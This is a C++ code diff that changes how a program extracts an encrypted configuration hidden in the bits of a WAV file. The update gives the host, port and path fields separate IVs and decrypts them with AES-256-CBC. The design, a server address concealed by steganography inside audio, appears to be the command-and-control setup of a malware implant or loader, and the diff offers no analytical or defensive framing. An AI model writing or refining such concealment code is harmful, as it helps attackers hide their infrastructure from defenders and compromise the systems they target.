@@ -68,7 +68,7 @@ std::vector<uint8_t> ExtractEmbeddedConfigFromWav(const std::string& filepath)
     std::vector<uint8_t> wav_data(std::istreambuf_iterator<char>(file), {});
 
     // AES key + IV + LEN + ENC_FIELDS
-    constexpr size_t nr_bytes_to_extract = 99;
+    constexpr size_t nr_bytes_to_extract = 131;
     constexpr size_t nr_bits_to_extract = nr_bytes_to_extract * 8;
     
     if(wav_data.size() < nr_bits_to_extract * 2)
@@ -103,31 +103,40 @@ std::tuple<std::string, std::string, std::string> ExtractAndDecryptConfig(const 
     for (auto b : config) std::cout << std::hex << (int)b << " ";
     std::cout << std::dec << "\n";
 
-    // Parse slices
+    size_t index = 0;
+
+    // === Extract AES key (32 bytes) ===
     auto key = std::vector<uint8_t>(config.begin(), config.begin() + 32);
-    auto iv = std::vector<uint8_t>(config.begin() + 32, config.begin() + 48);
+    index += 32;
 
-    size_t index = 48;
+    // === Extract Host ===
+    auto iv_host = std::vector<uint8_t>(config.begin() + index, config.begin() + index + 16);
+    index += 16;
 
-    // Extract host
     uint8_t len_host = config[index++];
     auto enc_host = std::vector<uint8_t>(config.begin() + index, config.begin() + index + len_host);
     index += len_host;
 
-    // Extract port
+    // === Extract Port ===
+    auto iv_port = std::vector<uint8_t>(config.begin() + index, config.begin() + index + 16);
+    index += 16;
+
     uint8_t len_port = config[index++];
     auto enc_port = std::vector<uint8_t>(config.begin() + index, config.begin() + index + len_port);
     index += len_port;
 
-    // Extract path
+    // === Extract Path ===
+    auto iv_path = std::vector<uint8_t>(config.begin() + index, config.begin() + index + 16);
+    index += 16;
+
     uint8_t len_path = config[index++];
     auto enc_path = std::vector<uint8_t>(config.begin() + index, config.begin() + index + len_path);
     index += len_path;
 
-    // Decrypt
-    std::string host = DecryptAES256CBC(enc_host, key, iv);
-    std::string port = DecryptAES256CBC(enc_port, key, iv);
-    std::string path = DecryptAES256CBC(enc_path, key, iv);
+    // === Decrypt all three ===
+    std::string host = DecryptAES256CBC(enc_host, key, iv_host);
+    std::string port = DecryptAES256CBC(enc_port, key, iv_port);
+    std::string path = DecryptAES256CBC(enc_path, key, iv_path);
 
     SecureZeroMemory(key.data(), key.size());
 
